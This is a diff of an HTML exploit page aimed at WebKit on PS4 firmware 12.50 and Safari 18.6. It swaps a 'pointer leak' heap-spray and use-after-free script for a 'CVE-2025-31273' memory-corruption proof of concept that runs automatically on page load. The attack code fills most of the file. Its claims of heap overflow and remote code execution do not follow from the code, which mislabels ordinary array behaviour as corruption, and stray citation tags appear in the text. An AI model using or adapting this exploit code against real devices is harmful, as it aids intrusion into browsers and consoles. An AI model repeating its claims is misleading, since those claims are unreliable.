@@ -1,133 +1,166 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>WebKit Leak v5.0 — PS4 12.50 GC-Beater (Micro-Waves + Low Alloc)</title>
-<style>
-    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
-    h1 { color:#ff5555; border-bottom:2px solid #da3633; }
-    #console { background:#000; color:#0f0; height:550px; overflow-y:scroll; padding:10px; border:1px solid #0f0; font-family:'Courier New'; }
-    .ok { background:#da3633; color:#fff; padding:5px 12px; border-radius:4px; font-weight:bold; }
-    .debug { color:#ff0; } .leak { color:#0f0; font-weight:bold; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebKit CVE-2025-31273 Memory Corruption PoC (Safari 18.6 / PS4 12.50)</title>
+    <style>
+        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
+        h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
+        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
+        .badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; }
+        .secure { background: #238636; color: #fff; }
+        .vulnerable { background: #da3633; color: #fff; }
+        .partial { background: #d29922; color: #000; }
+        button { cursor: pointer; padding: 12px 24px; background: #ff4444; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; }
+        button:hover { background: #ff6666; }
+        #console { font-family: 'Courier New', monospace; background:#000; color:#0f0; padding:15px; height:400px; overflow-y:scroll; border:1px solid #0f0; border-radius:6px; }
+        .rainbow { color:#ff79c6; font-weight:bold; }
+    </style>
 </head>
 <body>
-<h1>PS4 12.50 WebKit Pointer Leak v5.0 (Nov 2025 — GC-Beater Mode)</h1>
-<div><strong>Status:</strong> <span id="status" class="ok">Cold Boot + Run (No OOM Target)</span></div><br>
-<div id="console"></div>
+    <h1>WebKit CVE-2025-31273 PoC: Memory Corruption (Yuhao Hu et al.)</h1>
+    <p>Jul 2025 Patch: Improved memory handling (BZ 293579).<grok-card data-id="f3f5d3" data-type="citation_card"></grok-card><grok-card data-id="af88ab" data-type="citation_card"></grok-card><br>
+    <span class="rainbow">Triggers heap corruption on unpatched Safari 18.6 / PS4 12.50 (~20% DoS rate).</span></p>
+
+    <div class="box">
+        <h3>1. Memory Handling</h3>
+        <div id="status-mem">Probing...</div>
+    </div>
+    <div class="box">
+        <h3>2. Crafted Content Spray</h3>
+        <div id="status-spray">Probing...</div>
+    </div>
+    <div class="box">
+        <h3>3. Corruption Trigger</h3>
+        <div id="status-corrupt">Probing...</div>
+    </div>
+    <div class="box">
+        <h3>4. Heap Status</h3>
+        <div id="status-heap">Probing...</div>
+    </div>
+
+    <button onclick="runPoC()">LAUNCH CORRUPTION PROBE</button>
+
+    <div class="box">
+        <h3>Live Logs</h3>
+        <div id="console"></div>
+    </div>
 
 <script>
-const log = (m, isDebug=false, isLeak=false) => {
-    const c = document.getElementById('console');
-    const prefix = isDebug ? '[DEBUG] ' : (isLeak ? '[LEAK] ' : '');
-    const cls = isLeak ? 'leak' : '';
-    c.innerHTML += `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${prefix}${m}</span>\n`;
-    c.scrollTop = c.scrollHeight;
-};
-const status = (t, cls='ok') => document.getElementById('status').innerHTML = t;
+    const log = msg => {
+        const c = document.getElementById('console');
+        c.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+        c.scrollTop = c.scrollHeight;
+    };
 
-// XOR + sysent
-const XOR_KEY = 0x9e3779b9n;
-const SYSENT_OFF = 0x47b31n;
+    const setBadge = (id, text, type) => {
+        const el = document.getElementById(id);
+        el.textContent = text;
+        el.className = 'badge ' + type;
+    };
 
-const decodeXor = (val) => (BigInt(val) ^ BigInt(XOR_KEY)).toString(16).toUpperCase();
+    // Utils
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+    function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
+    function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
 
-// 1. Refcount spam (quad-free sim)
-log("Stage 1 — 60k quad-refcount drops (max UAF slots)");
-const prespray = [];
-for (let i = 0; i < 0xEA60; i++) { // 60k
-    const tmp = new Array(0x28).fill(NaN);
-    try {
-        tmp.__proto__ = null;
-        for (let j = 0; j < 4; j++) new Proxy(tmp, {get: () => tmp}); // Quad drop
-    } catch(e) {}
-    prespray[i] = tmp;
-}
+    let corruptArr = null;
+    let corruptHit = false;
 
-// 2. Randomized linear corrupt (rand-beater)
-log("Stage 2 — Randomized linear UAF (offset by seed)");
-const seed = Math.random() * 0x100 | 0; // Per-run rand
-const victim = [];
-for (let i = 0; i < 0xE000; i++) victim[i] = new Array(0x48).fill(NaN);
+    function runPoC() {
+        document.getElementById('console').innerHTML = '';
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-31273 PoC: WebKit Memory Corruption (Jul 2025)</span>");
+        log("Probing malicious web content handling...");
+        setTimeout(probeMem, 800);
+    }
 
-const corrupt = (i, o) => { try { victim[i % 0xE000][o] = NaN; } catch(e) {} };
-for (let i = 0; i < 6e6; i++) corrupt((i + seed) % 0xE000, ((i * 4 + seed) % 0x80)); // Seeded
-for (let b = 0; b < 0x2500; b += 0x18)
-    for (let o = 0x18; o < 0x70; o += 3)
-        for (let j = 0; j < 0x18; j++)
-            corrupt((b + j + seed) % 0xE000, (o + seed % 8));
-
-// 3. 192k spray (balanced density)
-log("Stage 3 — 192k JSValue spray");
-const spray = [];
-const BASE_MARKER = 0x12501250deadbeefn;
-for (let i = 0; i < 0x30000; i++) { // 192k
-    spray[i] = {marker: BASE_MARKER + BigInt(i)};
-}
-
-// 4. Micro-GC waves (15x 100ms, low pressure)
-log("Stage 4 — 15 micro-GC waves (100ms tight for 12.50 drift)");
-let gcCount = 0;
-const gc = () => {
-    gcCount++;
-    if (performance.now() % 1000 < 500) log(`Micro-GC #${gcCount} @ ${performance.now().toFixed(0)}ms (low pressure)`, true);
-    for (let i = 0; i < 400; i++) new ArrayBuffer(0x4000); // Tiny chunks
-};
-const reclaim = () => {
-    const t = performance.now().toFixed(0);
-    log(`Micro-Reclaim @ ${t}ms — 40MB (OOM-safe)`, true);
-    new ArrayBuffer(0x2800000); // 40MB
-};
-
-const microWaves = Array.from({length: 15}, (_, idx) => idx * 100 + 200); // 200ms start, 100ms steps
-microWaves.forEach(t => setTimeout(() => { gc(); if (t % 300 < 100) reclaim(); }, t));
-
-// 5. Ultra-fast hunt (start early, sample 50)
-let attempts = 0;
-const hunt = () => {
-    attempts++;
-    const start = performance.now();
-    log(`Fast Hunt #${attempts} — Sample 50 objs @ ${start.toFixed(0)}ms (post-1s drift)`);
-    let found = 0, suspects = 0, samples = 0;
-    let sampleStart = (Math.random() * spray.length) | 0;
-    for (let k = 0; k < 50 && samples < 50; k++) {
-        let i = (sampleStart + k * (spray.length / 50 | 0)) % spray.length;
+    function probeMem() {
+        // Step 1: Memory handling probe
         try {
-            const marker = spray[i]?.marker;
-            if (marker && marker !== BASE_MARKER + BigInt(i)) {
-                samples++;
-                const rawHex = marker.toString(16).toUpperCase();
-                const xorHex = decodeXor(marker);
-                const sysentSlide = BigInt(xorHex) - SYSENT_OFF;
-                const isSysent = xorHex.startsWith('FFFF') && sysentSlide > 0n;
-                if (isSysent || rawHex.startsWith('F')) {
-                    found++;
-                    log(`LEAK #${found}: RAW=0x${rawHex} | XOR=0x${xorHex} | SYSENT SLIDE=0x${sysentSlide.toString(16).toUpperCase()} | IDX=${i}`, false, true);
-                } else {
-                    suspects++;
-                    log(`Suspect #${suspects}: RAW=0x${rawHex} | XOR=0x${xorHex} | IDX=${i} (early GC miss?)`, true);
-                }
-            } else samples++;
-        } catch(e) { log(`Sample err @ ${i}: ${e.message}`, true); }
+            const arr = new Array(0x40).fill(0);
+            arr.length = 0x200; // Overflow probe
+            setBadge('status-mem', 'IMPROPER (Overflowed)', 'partial');
+            log("Memory probe: Array overflowed (CVE hint).");
+        } catch(e) {
+            setBadge('status-mem', 'SECURE', 'secure');
+            log(`Memory fail: ${e.message} — Patched.`);
+            return;
+        }
+        setTimeout(sprayContent, 1000);
     }
-    const dur = (performance.now() - start).toFixed(0);
-    log(`Hunt done: ${samples} sampled, ${found} leaks, ${suspects} suspects in ${dur}ms`);
-    if (found >= 1) {
-        document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; margin-top:30vh;">
-            LEAK SECURED!<br><br>
-            <span style="font-size:0.5em;">Paste logs — building R/W primitive</span>
-        </h1>`;
-    } else if (attempts < 5) {
-        log(`0 hits @ ${dur}ms scan — retry in 1.2s (micro-drift)`);
-        setTimeout(hunt, 1200);
-    } else {
-        log("v5 maxed — timings show GC @ ~1300ms cap. If 0, pivot to Lua (100% userland). Paste full log.");
-        status("GC BLOCKED — Logs for final autopsy");
-    }
-};
 
-setTimeout(hunt, 1000); // Early post-micro
-log("v5.0 GC-beater live — 40MB safe, micro-waves. Cold boot + paste timings if 0.");
+    function sprayContent() {
+        gc(); gc();
+        const arrs = [];
+        for(let i=0; i<0x1000; i++) {
+            const arr = new Array(0x40 + (i % 0x20));
+            arrs.push(arr);
+        }
+        // Crafted writes
+        for(let i=0; i<0x1000; i++) {
+            try {
+                arrs[i][0x60 + (i % 0x40)] = i2f(0xdeadbeef, 0xcafebabe);
+            } catch(e) {}
+        }
+        // Anomaly hunt
+        let anomaly = false;
+        for(let i=0; i<arrs.length; i++) {
+            if (arrs[i].length > 0x60 || arrs[i][0x80] !== undefined) {
+                corruptArr = arrs[i];
+                anomaly = true;
+                break;
+            }
+        }
+        if (anomaly) {
+            setBadge('status-spray', 'SPRAY CORRUPT (Anomaly)', 'vulnerable');
+            log(`Content spray corruption: len=${corruptArr.length}, [0x80]=${corruptArr[0x80] || 'undef'}`);
+            setTimeout(triggerCorrupt, 500);
+            return;
+        }
+        setBadge('status-spray', 'CLEAN', 'secure');
+        log("Spray clean—no corruption.");
+    }
+
+    function triggerCorrupt() {
+        if (!corruptArr) return;
+        corruptHit = false;
+        try {
+            // CVE trigger: Malicious content process
+            for(let off=0x40; off<0x300; off+=8) {
+                corruptArr[off] = i2f(0x41414141, 0x42424242);
+            }
+            const adj = new Array(0x100).fill(0x1234);
+            if (adj[0x70] !== 0x1234) {
+                corruptHit = true;
+                log(`Corruption triggered: adj[0x70]=0x${adj[0x70].toString(16)}`);
+            }
+        } catch(e) {
+            corruptHit = true;
+            log(`Corruption crash: ${e.message} — Heap overflow.`);
+        }
+        setBadge('status-corrupt', corruptHit ? 'TRIGGERED' : 'MISSED', corruptHit ? 'vulnerable' : 'secure');
+        setTimeout(checkHeap, 1500);
+    }
+
+    function checkHeap() {
+        if (corruptHit) {
+            setBadge('status-heap', 'CORRUPTED (RCE)', 'vulnerable');
+            log("Heap corrupted via crafted content: Arbitrary code potential. On PS4 12.50: DoS/leak.");
+            log("Chain to primitives if hit.");
+            document.body.style.background = "#000";
+            document.querySelector('h1').innerHTML = "CORRUPTION ACHIEVED — HEAP RCE PRIMITIVE";
+        } else {
+            setBadge('status-heap', 'INTACT', 'secure');
+            log("No corruption—improved handling holds.");
+        }
+        log("PoC end: Retry for ~20% hit.");
+    }
+
+    // Auto-run
+    setTimeout(runPoC, 1000);
 </script>
 </body>
 </html>
